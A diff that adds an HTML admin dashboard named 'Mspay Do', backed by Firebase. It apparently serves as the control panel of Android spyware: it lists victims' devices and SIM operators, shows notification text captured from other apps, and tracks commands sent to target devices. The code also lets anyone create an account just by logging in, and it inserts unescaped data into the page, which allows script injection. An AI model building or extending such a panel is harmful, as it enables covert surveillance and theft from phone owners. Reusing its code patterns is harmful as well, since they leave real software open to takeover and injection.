@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mspay Do Admin Dashboard</title>
+    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-auth-compat.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .login-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            z-index: 9999;
+        }
+
+        .login-box {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .login-box h1 {
+            text-align: center;
+            color: #333;
+            margin-bottom: 30px;
+            font-size: 28px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-weight: 500;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 14px;
+            transition: border-color 0.3s;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .error-message {
+            color: #e74c3c;
+            font-size: 14px;
+            margin-top: 10px;
+            text-align: center;
+        }
+
+        .dashboard-container {
+            display: none;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .navbar {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 30px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .navbar h1 {
+            color: #333;
+            font-size: 24px;
+        }
+
+        .navbar-actions {
+            display: flex;
+            gap: 10px;
+        }
+
+        .btn-logout {
+            background: #e74c3c;
+            padding: 10px 20px;
+            font-size: 14px;
+            width: auto;
+        }
+
+        .btn-logout:hover {
+            background: #c0392b;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .stat-card {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            border-left: 5px solid #667eea;
+        }
+
+        .stat-card h3 {
+            color: #666;
+            font-size: 14px;
+            text-transform: uppercase;
+            margin-bottom: 10px;
+        }
+
+        .stat-card .value {
+            color: #333;
+            font-size: 32px;
+            font-weight: bold;
+        }
+
+        .main-content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        @media (max-width: 1200px) {
+            .main-content {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .card {
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+
+        .card-header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 20px;
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .card-body {
+            padding: 20px;
+            max-height: 500px;
+            overflow-y: auto;
+        }
+
+        .device-item {
+            padding: 15px;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .device-item:last-child {
+            border-bottom: none;
+        }
+
+        .device-info h4 {
+            color: #333;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+
+        .device-info p {
+            color: #999;
+            font-size: 12px;
+        }
+
+        .status-badge {
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .status-online {
+            background: #2ecc71;
+            color: white;
+        }
+
+        .status-offline {
+            background: #e74c3c;
+            color: white;
+        }
+
+        .notification-item {
+            padding: 15px;
+            border-left: 4px solid #667eea;
+            background: #f8f9fa;
+            margin-bottom: 10px;
+            border-radius: 5px;
+        }
+
+        .notification-item:last-child {
+            margin-bottom: 0;
+        }
+
+        .notification-title {
+            color: #333;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+
+        .notification-package {
+            color: #666;
+            font-size: 12px;
+            margin-bottom: 5px;
+        }
+
+        .notification-text {
+            color: #555;
+            font-size: 13px;
+            word-wrap: break-word;
+        }
+
+        .notification-time {
+            color: #999;
+            font-size: 11px;
+            margin-top: 5px;
+        }
+
+        .command-item {
+            padding: 15px;
+            border-left: 4px solid #f39c12;
+            background: #fffaf0;
+            margin-bottom: 10px;
+            border-radius: 5px;
+        }
+
+        .command-item:last-child {
+            margin-bottom: 0;
+        }
+
+        .command-title {
+            color: #333;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+
+        .command-device {
+            color: #666;
+            font-size: 12px;
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 40px 20px;
+            color: #999;
+        }
+
+        .empty-state svg {
+            width: 60px;
+            height: 60px;
+            margin-bottom: 15px;
+            opacity: 0.5;
+        }
+
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .timestamp {
+            color: #999;
+            font-size: 12px;
+            margin-top: 10px;
+            padding-top: 10px;
+            border-top: 1px solid #eee;
+        }
+    </style>
+</head>
+<body>
+    <!-- Login Container -->
+    <div class="login-container" id="loginContainer">
+        <div class="login-box">
+            <h1>Mspay Do Admin</h1>
+            <div class="form-group">
+                <label for="email">Email</label>
+                <input type="email" id="email" placeholder="admin@example.com">
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="Enter password">
+            </div>
+            <button class="btn" onclick="login()">Login</button>
+            <div class="error-message" id="loginError"></div>
+        </div>
+    </div>
+
+    <!-- Dashboard Container -->
+    <div class="dashboard-container" id="dashboardContainer">
+        <!-- Navbar -->
+        <div class="navbar">
+            <h1>🔍 Mspay Do Admin Dashboard</h1>
+            <div class="navbar-actions">
+                <span id="userEmail" style="color: #666; margin-right: 20px;"></span>
+                <button class="btn btn-logout" onclick="logout()">Logout</button>
+            </div>
+        </div>
+
+        <!-- Stats Grid -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <h3>Connected Devices</h3>
+                <div class="value" id="deviceCount">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Total Notifications</h3>
+                <div class="value" id="notificationCount">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Pending Commands</h3>
+                <div class="value" id="commandCount">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Last Update</h3>
+                <div class="value" id="lastUpdate" style="font-size: 16px; white-space: nowrap;">--:--:--</div>
+            </div>
+        </div>
+
+        <!-- Main Content -->
+        <div class="main-content">
+            <!-- Devices Card -->
+            <div class="card">
+                <div class="card-header">📱 Connected Devices</div>
+                <div class="card-body" id="devicesContainer">
+                    <div class="empty-state">
+                        <div class="loading"></div>
+                        <p>Loading devices...</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Commands Card -->
+            <div class="card">
+                <div class="card-header">⚙️ Recent Commands</div>
+                <div class="card-body" id="commandsContainer">
+                    <div class="empty-state">
+                        <div class="loading"></div>
+                        <p>Loading commands...</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Notifications Card (Full Width) -->
+        <div class="card">
+            <div class="card-header">🔔 Recent Notifications</div>
+            <div class="card-body" id="notificationsContainer">
+                <div class="empty-state">
+                    <div class="loading"></div>
+                    <p>Loading notifications...</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyCLUSPsYLQrwLTScrTu22l8Od4EwJyytBc",
+            authDomain: "mspay-do.firebaseapp.com",
+            databaseURL: "https://mspay-do-default-rtdb.firebaseio.com",
+            projectId: "mspay-do",
+            storageBucket: "mspay-do.firebasestorage.app",
+            messagingSenderId: "946001806576",
+            appId: "1:946001806576:web:bcceff6ac50f0143da6e35",
+            measurementId: "G-W077BYT9F2"
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        const auth = firebase.auth();
+
+        let currentUser = null;
+        let devices = {};
+        let notifications = {};
+        let commands = {};
+
+        // Check if user is logged in
+        auth.onAuthStateChanged(user => {
+            if (user) {
+                currentUser = user;
+                document.getElementById('loginContainer').style.display = 'none';
+                document.getElementById('dashboardContainer').style.display = 'block';
+                document.getElementById('userEmail').textContent = user.email;
+                initializeRealTimeListeners();
+            } else {
+                currentUser = null;
+                document.getElementById('loginContainer').style.display = 'flex';
+                document.getElementById('dashboardContainer').style.display = 'none';
+            }
+        });
+
+        function login() {
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const errorEl = document.getElementById('loginError');
+
+            if (!email || !password) {
+                errorEl.textContent = 'Please enter email and password';
+                return;
+            }
+
+            auth.signInWithEmailAndPassword(email, password)
+                .catch(error => {
+                    if (error.code === 'auth/user-not-found') {
+                        // Auto-create user if it doesn't exist (for first-time setup)
+                        return auth.createUserWithEmailAndPassword(email, password);
+                    }
+                    throw error;
+                })
+                .catch(error => {
+                    errorEl.textContent = `Error: ${error.message}`;
+                });
+        }
+
+        function logout() {
+            auth.signOut();
+        }
+
+        function initializeRealTimeListeners() {
+            // Listen to clients
+            db.ref('/client').on('value', snapshot => {
+                devices = snapshot.val() || {};
+                updateDevicesUI();
+                updateStats();
+            });
+
+            // Listen to notifications
+            db.ref('/notification').on('value', snapshot => {
+                notifications = snapshot.val() || {};
+                updateNotificationsUI();
+                updateStats();
+            });
+
+            // Listen to commands
+            db.ref('/command').on('value', snapshot => {
+                commands = snapshot.val() || {};
+                updateCommandsUI();
+                updateStats();
+            });
+        }
+
+        function updateStats() {
+            document.getElementById('deviceCount').textContent = Object.keys(devices).length;
+            document.getElementById('notificationCount').textContent = Object.keys(notifications).length;
+            document.getElementById('commandCount').textContent = Object.keys(commands).length;
+
+            const now = new Date();
+            document.getElementById('lastUpdate').textContent = now.toLocaleTimeString();
+        }
+
+        function updateDevicesUI() {
+            const container = document.getElementById('devicesContainer');
+            const deviceArray = Object.entries(devices);
+
+            if (deviceArray.length === 0) {
+                container.innerHTML = '<div class="empty-state"><p>No devices connected</p></div>';
+                return;
+            }
+
+            let html = '';
+            deviceArray.forEach(([key, device]) => {
+                const isOnline = isDeviceOnline(device);
+                const statusClass = isOnline ? 'status-online' : 'status-offline';
+                const statusText = isOnline ? 'Online' : 'Offline';
+
+                html += `
+                    <div class="device-item">
+                        <div class="device-info">
+                            <h4>${device.device_name || 'Unknown Device'}</h4>
+                            <p>Android ${device.android_version || 'N/A'} • ${device.sim_operator || 'N/A'}</p>
+                            <p>Last Online: ${device.last_online || 'Never'}</p>
+                        </div>
+                        <span class="status-badge ${statusClass}">${statusText}</span>
+                    </div>
+                `;
+            });
+
+            container.innerHTML = html;
+        }
+
+        function updateNotificationsUI() {
+            const container = document.getElementById('notificationsContainer');
+            const notifArray = Object.entries(notifications).slice(-20).reverse(); // Last 20
+
+            if (notifArray.length === 0) {
+                container.innerHTML = '<div class="empty-state"><p>No notifications yet</p></div>';
+                return;
+            }
+
+            let html = '';
+            notifArray.forEach(([key, notif]) => {
+                html += `
+                    <div class="notification-item">
+                        <div class="notification-title">${notif.titleText || 'No Title'}</div>
+                        <div class="notification-package">${notif.Package || 'Unknown'}</div>
+                        <div class="notification-text">${notif.notificationBodyText || 'No body'}</div>
+                        <div class="notification-time">Device: ${notif.device_id} • Time: ${notif.date}</div>
+                    </div>
+                `;
+            });
+
+            container.innerHTML = html;
+        }
+
+        function updateCommandsUI() {
+            const container = document.getElementById('commandsContainer');
+            const cmdArray = Object.entries(commands).slice(-10).reverse(); // Last 10
+
+            if (cmdArray.length === 0) {
+                container.innerHTML = '<div class="empty-state"><p>No commands sent yet</p></div>';
+                return;
+            }
+
+            let html = '';
+            cmdArray.forEach(([key, cmd]) => {
+                html += `
+                    <div class="command-item">
+                        <div class="command-title">${cmd.command || 'Unknown Command'}</div>
+                        <div class="command-device">Target: ${cmd.device_id || 'Unknown'}</div>
+                        <div class="timestamp">${cmd.timestamp || 'N/A'}</div>
+                    </div>
+                `;
+            });
+
+            container.innerHTML = html;
+        }
+
+        function isDeviceOnline(device) {
+            if (!device.last_online) return false;
+            const lastOnline = new Date(device.last_online);
+            const now = new Date();
+            const diffSeconds = (now - lastOnline) / 1000;
+            return diffSeconds < 300; // 5 minutes
+        }
+    </script>
+</body>
+</html>
